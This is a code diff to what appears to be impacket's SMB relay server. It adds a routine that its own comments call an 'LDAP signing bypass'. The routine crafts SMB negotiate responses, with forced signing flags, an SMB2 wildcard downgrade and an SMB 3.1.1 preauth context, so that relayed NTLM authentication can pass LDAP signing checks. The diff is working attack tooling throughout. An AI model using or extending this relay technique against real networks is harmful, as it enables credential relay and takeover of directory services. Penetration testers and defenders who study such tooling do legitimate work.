@@ -27,6 +27,7 @@ import struct
 import logging
 import time
 import calendar
+import os
 import random
 import string
 import socket
@@ -34,7 +35,7 @@ import ntpath
 
 from binascii import hexlify, unhexlify
 from six import b
-from impacket import smb, ntlm, LOG, smb3
+from impacket import smb, ntlm, LOG, smb3, wintime
 from impacket.nt_errors import STATUS_MORE_PROCESSING_REQUIRED, STATUS_ACCESS_DENIED, STATUS_SUCCESS, STATUS_NETWORK_SESSION_EXPIRED, STATUS_BAD_NETWORK_NAME
 from impacket.spnego import SPNEGO_NegTokenResp, SPNEGO_NegTokenInit, TypesMech
 from impacket.smbserver import SMBSERVER, outputToJohnFormat, writeJohnOutputToFile
@@ -142,7 +143,10 @@ class SMBRelayServer(Thread):
         respPacket['SessionID'] = 0
 
         relayInitialAuthentication = self.config.disableMulti
-        if self.config.disableMulti:
+        if connData.get('SMBClient') is not None:
+            # Second NEGOTIATE after our SMB2 wildcard answer, the target is already connected
+            relayInitialAuthentication = False
+        elif self.config.disableMulti:
             if self.config.mode.upper() == 'REFLECTION':
                 self.targetprocessor = TargetsProcessor(singleTarget='SMB://%s:445/' % connData['ClientIP'])
 
@@ -221,8 +225,8 @@ class SMBRelayServer(Thread):
         respSMBCommand['MaxTransactSize'] = 65536
         respSMBCommand['MaxReadSize'] = 65536
         respSMBCommand['MaxWriteSize'] = 65536
-        respSMBCommand['SystemTime'] = smb.POSIXtoFT(calendar.timegm(time.gmtime()))
-        respSMBCommand['ServerStartTime'] = smb.POSIXtoFT(calendar.timegm(time.gmtime()))
+        respSMBCommand['SystemTime'] = wintime.posix_to_filetime(calendar.timegm(time.gmtime()))
+        respSMBCommand['ServerStartTime'] = wintime.posix_to_filetime(calendar.timegm(time.gmtime()))
         respSMBCommand['SecurityBufferOffset'] = 0x80
 
         blob = SPNEGO_NegTokenInit()
@@ -232,11 +236,42 @@ class SMBRelayServer(Thread):
         respSMBCommand['Buffer'] = blob.getData()
         respSMBCommand['SecurityBufferLength'] = len(respSMBCommand['Buffer'])
 
+        self.applyReauthBypassNegotiate(respSMBCommand, isSMB1)
+
         respPacket['Data'] = respSMBCommand
 
         smbServer.setConnectionData(connId, connData)
 
         return None, [respPacket], STATUS_SUCCESS
+
+    def applyReauthBypassNegotiate(self, respSMBCommand, isSMB1):
+        # The LDAP signing bypass needs a signed inbound handshake so the relayed token carries a mechListMIC
+        if not self.config.reauth_bypass or self.target is None or self.target.scheme not in ('ldap', 'ldaps'):
+            return
+
+        respSMBCommand['SecurityMode'] = smb3.SMB2_NEGOTIATE_SIGNING_ENABLED | smb3.SMB2_NEGOTIATE_SIGNING_REQUIRED
+        if isSMB1:
+            # Steer the SMB1 client onto the SMB2 wildcard so it re-negotiates with contexts
+            respSMBCommand['DialectRevision'] = smb3.SMB2_DIALECT_WILDCARD
+            respSMBCommand['NegotiateContextCount'] = 0
+            respSMBCommand['NegotiateContextOffset'] = 0
+            return
+
+        preauth = smb3.SMB2PreAuthIntegrityCapabilities()
+        preauth['HashAlgorithmCount'] = 1
+        preauth['HashAlgorithms'] = struct.pack('<H', 1)  # SHA-512, the only algorithm defined
+        preauth['Salt'] = os.urandom(32)
+        preauth['SaltLength'] = len(preauth['Salt'])
+        context = smb3.SMB2NegotiateContext()
+        context['ContextType'] = smb3.SMB2_PREAUTH_INTEGRITY_CAPABILITIES
+        context['Data'] = preauth.getData()
+        context['DataLength'] = len(context['Data'])
+        respSMBCommand['DialectRevision'] = smb3.SMB2_DIALECT_311
+        respSMBCommand['NegotiateContextCount'] = 1
+        context_offset = (0x80 + len(respSMBCommand['Buffer']) + 7) & ~7
+        respSMBCommand['NegotiateContextOffset'] = context_offset
+        respSMBCommand['Padding'] = b'\x00' * (context_offset - 0x80 - len(respSMBCommand['Buffer']))
+        respSMBCommand['NegotiateContextList'] = context.getData()
 
 
     def SmbSessionSetup(self, connId, smbServer, recvPacket):
